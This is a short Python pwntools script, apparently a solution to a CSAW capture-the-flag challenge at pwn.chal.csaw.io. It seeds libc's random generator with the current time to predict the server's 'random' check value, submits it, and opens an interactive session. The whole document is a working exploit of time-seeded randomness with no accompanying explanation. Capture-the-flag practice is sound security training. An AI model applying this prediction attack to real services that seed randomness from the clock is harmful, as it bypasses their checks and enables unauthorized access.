from pwn import *
import time
from ctypes import CDLL

p = remote("pwn.chal.csaw.io", 5002)
clibc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

clibc.srand(int(time.time()))
leak = clibc.rand() % 0x100000

p.sendlineafter("check?", str(leak))

p.interactive()
